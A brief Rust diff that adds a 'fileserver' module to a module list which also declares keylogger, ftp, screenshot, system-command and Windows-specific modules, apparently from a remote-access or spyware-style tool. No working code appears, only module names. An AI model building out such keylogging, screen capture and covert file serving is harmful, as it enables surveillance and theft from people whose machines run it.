@@ -5,5 +5,6 @@ pub mod keylogger;
 pub mod ftp;
 pub mod screenshot;
 pub mod systemcmd;
+pub mod fileserver;
 #[cfg(target_os = "windows")]
 pub mod windowsfunctions;
